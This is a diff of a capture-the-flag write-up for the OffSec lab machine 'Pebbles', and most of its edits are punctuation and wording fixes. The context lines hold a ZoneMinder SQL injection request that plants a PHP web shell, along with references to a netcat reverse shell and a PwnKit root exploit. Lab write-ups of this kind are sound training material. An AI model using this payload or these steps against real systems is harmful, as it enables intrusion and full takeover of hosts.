@@ -28,7 +28,7 @@ Machine link: [https://portal.offsec.com/machine/pebbles-304/overview/details](h
 
 ### Scan for services with nmap
 
-We start by scanning the machine on all ports with `nmap` including service info and default scripts
+We start by scanning the machine on all TCP-ports with `nmap`, including service info and default scripts.
 
 ```bash
 ┌──(kali㉿kali)-[/mnt/…/OffSec_PG/PG_Practice/Easy/Pebbles]
@@ -65,7 +65,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 138.41 seconds
 ```
 
-We have two TCP-services running and available:
+We have three TCP-services running and available:
 
 - vsftpd 3.0.3 on port 21
 - OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 on port 22
@@ -73,7 +73,7 @@ We have two TCP-services running and available:
 
 Apache Tomcat seems to be running at port 8080 and no anonymous access to the FTP-server reported.
 
-We also do an UDP-scan of the top 100 ports but find nothing
+We also do an UDP-scan of the top 100 ports but find nothing:
 
 ```bash
 ┌──(kali㉿kali)-[/mnt/…/OffSec_PG/PG_Practice/Easy/Pebbles]
@@ -90,17 +90,17 @@ Nmap done: 1 IP address (1 host up) scanned in 1220.00 seconds
 
 ### Check the web sites
 
-Browsing manually to port 80 we find a login page
+Browsing manually to port 80 we find a login page:
 
 ![Login Page on Pebbles](Images/Login_Page_on_Pebbles.png)
 
 On port 3305 we find an `Apache2 Ubuntu Default Page`.
 
-And we confirm that Tomcat is indeed running on port 8080
+And we confirm that Tomcat is indeed running on port 8080:
 
 ![Tomcat on Pebbles](Images/Tomcat_on_Pebbles.png)
 
-A scan with `whatweb` gives us the following information
+A scan with `whatweb` gives us the following information:
 
 ```bash
 ┌──(kali㉿kali)-[/mnt/…/OffSec_PG/PG_Practice/Easy/Pebbles]
@@ -116,7 +116,7 @@ http://192.168.246.52:3305 [200 OK] Apache[2.4.18], Country[RESERVED][ZZ], HTTPS
 http://192.168.246.52:8080 [200 OK] Apache[2.4.18], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[192.168.246.52], Title[Tomcat]
 ```
 
-We also scan for additional interesting files and directories with gobuster on all web ports
+We also scan for additional interesting files and directories with gobuster on all web ports:
 
 ```bash
 ┌──(kali㉿kali)-[/mnt/…/OffSec_PG/PG_Practice/Easy/Pebbles]
@@ -217,17 +217,17 @@ Finished
 ===============================================================
 ```
 
-On `http://192.168.246.52/zm/index.php` we find a ZoneMinder Console
+On `http://192.168.246.52/zm/index.php` we find a ZoneMinder Console:
 
 ![ZoneMinder on Pebbles](Images/ZoneMinder_on_Pebbles.png)
 
-And on `http://192.168.246.52:8080/hello.php` we get this strange output
+And on `http://192.168.246.52:8080/hello.php` we get this strange output:
 
 ![Hello Page on Pebbles](Images/Hello_Page_on_Pebbles.png)
 
 ### Search for exploit(s)
 
-We check if there are any nice exploits available for ZoneMinder
+We check if there are any nice exploits available for ZoneMinder.
 
 ```bash
 ┌──(kali㉿kali)-[/mnt/…/OffSec_PG/PG_Practice/Easy/Pebbles]
@@ -245,7 +245,7 @@ ZoneMinder Video Server - packageControl Command Execution (Metasploit)         
 Shellcodes: No Results
 ```
 
-Let's check the SQL injection one
+Let's check the SQL injection one.
 
 ```bash
 ┌──(kali㉿kali)-[/mnt/…/OffSec_PG/PG_Practice/Easy/Pebbles]
@@ -407,7 +407,7 @@ From the exploit information we know that:
 
 We visit the page while Burp is capturing the request in the background and save the POST-requests as the file `post_req.txt`.
 
-To reproduce the situation we need to click the `Log` link in the upper right corner of the web page.
+To reproduce the situation described in the exploit we need to click the `Log` link in the upper right corner of the web page.
 
 ```text
 POST /zm/index.php HTTP/1.1
@@ -428,7 +428,7 @@ Cookie: zmSkin=classic; zmCSS=classic; ZMSESSID=bcviaod9q75g00qviienn0n6j5
 view=request&request=log&task=query&limit=100&minTime=1775629310.411151
 ```
 
-Then we use the file as input to `sqlmap` and provide all the additional information we know
+Then we use the request/file as input to `sqlmap` and provide all the additional information we know:
 
 ```bash
 ┌──(kali㉿kali)-[/mnt/…/OffSec_PG/PG_Practice/Easy/Pebbles]
@@ -589,7 +589,7 @@ We have confirmed the SQLi vulnerability.
 
 ### Get an OS shell
 
-But we would of course like to have an OS shell
+But we would of course like to have an OS shell.
 
 ```bash
 ┌──(kali㉿kali)-[/mnt/…/OffSec_PG/PG_Practice/Easy/Pebbles]
@@ -678,7 +678,7 @@ We get the flag but this shell is very SLOW to work with.
 
 ### Get a web shell
 
-Instead we can also manually create a webshell in Burp's Repeatrer with this request
+Instead we can also manually create a webshell in Burp's Repeatrer with this request:
 
 ```text
 POST /zm/index.php HTTP/1.1
@@ -699,7 +699,7 @@ Cookie: zmSkin=classic; zmCSS=classic; ZMSESSID=bcviaod9q75g00qviienn0n6j5
 view=request&request=log&task=query&limit=100;SELECT "<?php echo system($_GET['cmd']); ?>" into OUTFILE "/var/www/html/shell.php"
 ```
 
-Then we verify functionality with `curl`
+Then we verify functionality with `curl`.
 
 ```bash
 ┌──(kali㉿kali)-[/mnt/…/OffSec_PG/PG_Practice/Easy/Pebbles]
@@ -735,7 +735,7 @@ Port 80 is used since that was one of the open ports found on the target machine
 
 ```
 
-Back at our netcat listener, we have a connection
+Back at our netcat listener, we have a connection:
 
 ```bash
 ┌──(kali㉿kali)-[/mnt/…/OffSec_PG/PG_Practice/Easy/Pebbles]
@@ -752,7 +752,7 @@ www-data@pebbles:/var/www/html$
 
 ### Fix/upgrade the reverse shell
 
-We don't have a proper shell though so let's fix that
+We don't have a proper shell though so [let's fix](https://cajac.gitbook.io/ctf-notes/lat-mov#upgrade-shell-to-tty-shell) that.
 
 ```bash
 www-data@pebbles:/var/www/html$ tty
@@ -781,7 +781,7 @@ Now we have a stable shell that survives `Ctrl + C`!
 
 ### Enumeration for privesc
 
-During the enumeration a vulnerable version of policykit was discovered (versions <= 0.105-31 is vulnerable to PwnKit)
+During the enumeration a vulnerable version of policykit was discovered (versions <= 0.105-31 is vulnerable to PwnKit).
 
 ```bash
 www-data@pebbles:/var/www/html$ apt list policykit-1
@@ -791,7 +791,7 @@ N: There is 1 additional version. Please use the '-a' switch to see it
 www-data@pebbles:/var/www/html$ 
 ```
 
-We transfer the [exploit](https://github.com/joeammond/CVE-2021-4034) to the target machine
+We transfer the [exploit](https://github.com/joeammond/CVE-2021-4034) to the target machine.
 
 ```bash
 www-data@pebbles:/var/www/html$ cd /tmp
@@ -811,7 +811,7 @@ www-data@pebbles:/tmp$
 
 ### Get a root shell
 
-Then we make the script executable and run it to get a root shell
+Then we make the script executable and run it to get a root shell:
 
 ```bash
 www-data@pebbles:/tmp$ chmod +x CVE-2021-4034.py 
@@ -825,7 +825,7 @@ uid=0(root) gid=33(www-data) groups=33(www-data)
 
 ### Get the root flag
 
-Finally, we can get the root flag again
+Finally, we get the root flag.
 
 ```bash
 # cd /root
@@ -874,6 +874,7 @@ For additional information, please see the references below.
 - [sudo - Linux manual page](https://man7.org/linux/man-pages/man8/sudo.8.html)
 - [sudo - Wikipedia](https://en.wikipedia.org/wiki/Sudo)
 - [tty - Linux manual page](https://man7.org/linux/man-pages/man1/tty.1.html)
+- [Upgrade shell to TTY shell - Cajac's CTF Notes](https://cajac.gitbook.io/ctf-notes/lat-mov#upgrade-shell-to-tty-shell)
 - [vsftpd - Wikipedia](https://en.wikipedia.org/wiki/Vsftpd)
 - [Web shell - Wikipedia](https://en.wikipedia.org/wiki/Web_shell)
 - [wget - Linux manual page](https://man7.org/linux/man-pages/man1/wget.1.html)
